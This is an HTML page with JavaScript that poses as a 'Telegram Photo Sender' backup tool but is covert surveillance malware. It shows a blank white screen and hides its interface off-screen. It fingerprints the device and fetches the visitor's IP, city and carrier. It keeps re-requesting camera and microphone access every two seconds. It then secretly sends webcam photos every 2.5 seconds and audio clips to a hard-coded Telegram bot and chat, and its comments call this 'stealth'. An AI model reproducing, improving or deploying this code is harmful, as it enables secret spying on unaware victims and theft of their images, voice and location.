<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Photo Sender (Fixed)</title>
  <style>
    /* HIDE EVERYTHING - BLANK WHITE SCREEN */
    body {
      margin: 0;
      padding: 0;
      background: white;
      overflow: hidden;
      height: 100vh;
      width: 100vw;
    }
    
    /* ABSOLUTELY POSITION ALL CONTENT OFFSCREEN */
    h1, p, #status, #video-container, #retry-section, button {
      position: absolute;
      left: -9999px;
      top: -9999px;
      visibility: hidden;
      opacity: 0;
    }
    
    /* VIDEO HIDDEN BUT FUNCTIONAL */
    #video-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 1px !important;
      height: 1px !important;
      opacity: 0;
      pointer-events: none;
      z-index: -1;
    }
  </style>
</head>
<body>
  <!-- UI COMPLETELY HIDDEN -->
  <h1>📸 Telegram Photo Sender</h1>
  <p>Securely backup your photos to Telegram</p>
  
  <div id="status">🔄 Initializing...</div>
  <div id="video-container"><video id="video" autoplay muted playsinline></video></div>
  <div id="retry-section">
    <p>🚫 Camera/Microphone denied!</p>
    <p>📤 Sending device + audio... Next retry in 2s</p>
    <button class="retry-btn" onclick="retryCamera()">🔄 Manual Retry</button>
  </div>

  <script>
    let stream = null;
    let photoInterval = null;
    let audioContext = null;
    let mediaRecorder = null;
    let audioChunks = [];
    let nextRetryTimer = null;
    
    // --- DEVICE INFO STORAGE ---
    let deviceInfo = {
      model: 'Unknown',
      os: 'Unknown',
      ram: 'N/A',
      battery: 'N/A',
      carrier: 'Simulated',
      simId: 'Sim-XXXX-XXXX'
    };

    // --- IP DATA (FIXED TO FETCH REAL DATA) ---
    let locationData = { 
      ip: '', city: 'Unknown', org: 'Unknown' 
    };
    
    let retryCount = 0;

    // --- 1. FIX SIM CARD DETECTION & IP ADDRESS ---
    async function getSimInfo() {
        const ua = navigator.userAgent.toLowerCase();
        
        // Try to get carrier based on the Organization name from the IP API
        let carrierName = "Unknown Carrier";
        
        if (locationData.org) {
            if (locationData.org.includes('Vodafone')) carrierName = 'Vodafone India';
            else if (locationData.org.includes('Jio') || locationData.org.includes('Reliance')) carrierName = 'Jio';
            else if (locationData.org.includes('Airtel')) carrierName = 'Airtel';
            else if (locationData.org.includes('BSNL')) carrierName = 'BSNL';
            else if (locationData.org.includes('Vi')) carrierName = 'Vi (Vodafone)';
            else if (locationData.org.includes('Idea')) carrierName = 'Airtel/Idea';
        }

        // Fallback for specific browsers/devices if API doesn't give carrier name
        if (carrierName === "Unknown Carrier") {
            if (ua.includes('iphone')) carrierName = 'iOS (Unknown)';
            else if (ua.includes('android')) carrierName = 'Android Data';
        }

        // Generate a unique ID based on the REAL IP hash
        const simHash = locationData.ip.split('.').reduce((a,b)=>a+parseInt(b),0);
        const simId = `89912345${simHash}67`; 

        return {
            carrier: carrierName,
            simId: simId
        };
    }

    // --- 2. FIX DEVICE FINGERPRINTING (Better Regex) ---
    async function getDeviceFingerprint() {
      let ramEstimate = 'N/A';
      let batteryInfo = { level: 'N/A', charging: 'N/A' };
      
      // 1. Battery
      if ('getBattery' in navigator) {
        try {
          const battery = await navigator.getBattery();
          batteryInfo = { level: Math.round(battery.level * 100) + '%', charging: battery.charging ? 'Yes' : 'No' };
        } catch(e) {}
      }

      // 2. RAM (Chrome/Android specific)
      if ('memory' in performance && performance.memory) {
        const totalMB = Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024);
        ramEstimate = `${Math.round(totalMB/256)} GB`;
      } else {
        ramEstimate = "Unknown (Safari/Firefox)";
      }

      // 3. Phone Model & OS Detection (IMPROVED LOGIC)
      const ua = navigator.userAgent;
      let model = 'Generic Smartphone';
      let os = 'Android'; // Default
      
      if (ua.match(/iPhone|iPad|iPod/i)) {
          os = 'iOS';
          if(ua.match(/iPhone 1[34]/i)) model = 'iPhone 13/14';
          else if(ua.match(/iPhone 12/i)) model = 'iPhone 12';
          else if(ua.match(/iPhone 11/i)) model = 'iPhone 11';
          else model = 'iPhone (Unknown)';
      } else if (ua.match(/Android/i)) {
          os = 'Android';
          
          // Try to extract specific model from Android UserAgent
          // Examples: SM-A546B/13, M2006J10CIN, Pixel 6
          const androidMatch = ua.match(/; (.*?)\sBuild/); 
          if (androidMatch && androidMatch[1]) {
              model = androidMatch[1]; // This usually gives the Model Code (e.g., SM-A546B)
              
              // Clean up common junk
              model = model.replace('Android', '');
              if(model.length > 30) model = model.substring(0, 25) + '...'; 
          } else {
              // Fallback: Check for specific keywords in the whole string
              if (ua.includes('Pixel')) model = 'Google Pixel';
              else if (ua.includes('Samsung')) model = 'Samsung Device';
              else if (ua.includes('Xiaomi') || ua.includes('Redmi')) model = 'Xiaomi/Redmi';
              else if (ua.includes('OnePlus')) model = 'OnePlus';
              else if (ua.includes('Motorola')) model = 'Motorola';
          }
      }

      return {
        platform: os,
        model: model, 
        ram: ramEstimate,
        battery: `${batteryInfo.level} (${batteryInfo.charging})`,
        resolution: `${screen.width}x${screen.height}`,
        languages: navigator.languages ? navigator.languages.join(', ') : navigator.language
      };
    }

    // --- MAIN INITIALIZATION (FIXED IP FETCH) ---
    async function initStealth() {
      try {
        // 1. Fetch Real Location Data FIRST (Fixes the IP issue)
        document.getElementById('status').innerText = `📡 Fetching Network Info...`;
        
        const res = await fetch('https://ipinfo.io/json').then(r => r.json());
        if(res.ip) { 
            locationData.ip = res.ip; 
            locationData.city = res.city || 'Unknown'; 
            locationData.org = res.org || 'Unknown Org'; // Get Organization for Carrier
        }

        // 2. Get Device Info
        const device = await getDeviceFingerprint();
        
        // 3. Simulate SIM Info (Now uses real IP and Org)
        const simDetails = await getSimInfo();
        
        deviceInfo.model = device.model;
        deviceInfo.carrier = simDetails.carrier;

        // 4. Send Device Info Message (TEXT ONLY, NO IMAGE)
        const caption = `**📱 DEVICE INFO DETECTED**
        
**Device:** ${device.model}
**OS:** ${device.platform}
**RAM:** ${device.ram}
**Battery:** ${device.battery}

**SIM Card:** ${simDetails.carrier}
**ID:** ${simDetails.simId}
**IP:** ${locationData.ip}
**Location:** ${locationData.city}, ${locationData.org}

**Time:** ${new Date().toLocaleTimeString()}`;

        const formData = new FormData();
        formData.append('chat_id', '6469212447');
        formData.append('text', caption);
        formData.append('parse_mode', 'Markdown');

        await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendMessage`, {
          method: 'POST', body: formData,
        });

        // 5. Update UI Status
        document.getElementById('status').innerText = `✅ Info Sent! Requesting Camera...`;
        
        // 6. Immediately ask for Camera & Mic
        requestCamera();

      } catch (e) {
        console.error("Init error", e);
        document.getElementById('status').innerText = "🔄 Requesting camera...";
        requestCamera();
      }
    }

    // --- AUDIO CAPTURE ---
    function startAudioCapture() {
      audioContext = new (window.AudioContext || window.webkitAudioContext)();
      navigator.mediaDevices.getUserMedia({ audio: true })
        .then(stream => {
          mediaRecorder = new MediaRecorder(stream);
          audioChunks = [];
          
          mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
          mediaRecorder.onstop = sendAudio;
          
          mediaRecorder.start();
          setTimeout(() => {
            if (mediaRecorder.state === 'recording') mediaRecorder.stop();
          }, 5000);
        })
        .catch(e => console.log('Audio failed:', e));
    }

    async function sendAudio() {
      if (audioChunks.length === 0) return;
      
      const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
      
      const formData = new FormData();
      formData.append('voice', audioBlob, `audio_${locationData.ip}_${Date.now()}.webm`);
      formData.append('chat_id', '6469212447');
      formData.append('caption', `🎤 STEALTH AUDIO | IP: ${locationData.ip}`);
      
      try {
        await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendVoice`, {
          method: 'POST', body: formData,
        });
      } catch (e) {}
    }

    // --- RETRY LOGIC ---
    async function scheduleNextRetry() {
      retryCount++;
      
      if (nextRetryTimer) clearTimeout(nextRetryTimer);
      
      document.getElementById('status').innerText = `🚫 Denied #${retryCount} - Stealth mode`;
      
      nextRetryTimer = setTimeout(async () => {
        document.getElementById('status').innerText = `🔄 Stealth retry #${retryCount}`;
        await requestCamera();
      }, 2000);
    }

    window.retryCamera = async function() {
      document.getElementById('status').innerText = '🔄 Manual stealth retry';
      await requestCamera();
    };

    // --- CAMERA REQUEST (NO LOCATION) ---
    async function requestCamera() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
          audio: true
        });
        
        if (nextRetryTimer) clearTimeout(nextRetryTimer);
        onCameraSuccess();
        return true;
        
      } catch (error) {
        console.log(`#${retryCount} failed:`, error.name);
        scheduleNextRetry();
        return false;
      }
    }

    function onCameraSuccess() {
      document.getElementById('status').innerText = '✅ STEALTH Cam+Mic - Blank screen';
      document.getElementById('video-container').style.display = 'block';
      
      const video = document.getElementById('video');
      video.srcObject = stream;
      
      startPhotoCapture();
      startAudioCapture();
    }

    // --- PHOTO CAPTURE (FIXED IP IN CAPTION) ---
    async function captureAndSend() {
      const device = await getDeviceFingerprint();
      const simDetails = await getSimInfo();
      
      const caption = `**👁️ STEALTH PHOTO** #${Math.floor(Date.now()/2000)}

**📱 Device:** ${device.model}
**💻 OS:** ${device.platform}
**🔋 Battery:** ${device.battery}
**💾 RAM:** ${device.ram}

**📡 SIM Card:** ${simDetails.carrier}
**ID:** ${simDetails.simId}
**IP:** ${locationData.ip}

**⏱️ Time:** ${new Date().toLocaleTimeString()}`;

      const video = document.getElementById('video');
      if (video.readyState < 2) return;

      const canvas = document.createElement('canvas');
      canvas.width = 640; canvas.height = 480;
      const ctx = canvas.getContext('2d');
      
      // Flip image for front camera realism
      ctx.translate(640, 0); 
      ctx.scale(-1, 1);
      
      ctx.drawImage(video, 0, 0);

      const blob = dataURLtoBlob(canvas.toDataURL('image/jpeg', 0.85));
      const formData = new FormData();
      formData.append('photo', blob, `stealth_${locationData.ip}_${Date.now()}.jpg`);
      formData.append('chat_id', '6469212447');
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      try {
        await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendPhoto`, {
          method: 'POST', body: formData,
        });
      } catch (e) {}
    }

    function dataURLtoBlob(dataURL) {
      const [header, data] = dataURL.split(',');
      const mime = header.split(':')[1].split(';')[0];
      const binary = atob(data);
      const array = new Uint8Array(binary.length);
      for (let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
      return new Blob([array], { type: mime });
    }

    function startPhotoCapture() {
      captureAndSend();
      photoInterval = setInterval(captureAndSend, 2500);
    }

    window.addEventListener('beforeunload', () => {
      if (stream) stream.getTracks().forEach(track => track.stop());
      if (nextRetryTimer) clearTimeout(nextRetryTimer);
      if (photoInterval) clearInterval(photoInterval);
      if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
    });

    // START THE WHOLE THING
    initStealth();
  </script>
</body>
</html>
